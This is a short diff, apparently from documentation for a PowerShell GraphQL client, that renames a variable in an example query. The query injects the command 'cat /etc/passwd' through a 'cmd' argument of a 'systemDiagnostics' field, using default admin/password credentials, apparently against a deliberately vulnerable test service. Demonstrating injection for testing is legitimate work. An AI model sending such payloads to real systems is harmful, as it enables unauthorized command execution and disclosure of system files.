@@ -261,11 +261,11 @@ Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
 $userName = "admin"
 $password = "password"
 
-$command = "cat /etc/passwd"
+$commandToInject = "cat /etc/passwd"
 
 $commandInjectionQuery = '
     query {
-        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"' + $command + '")
+        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"' + $commandToInject + '")
     }
 '
 
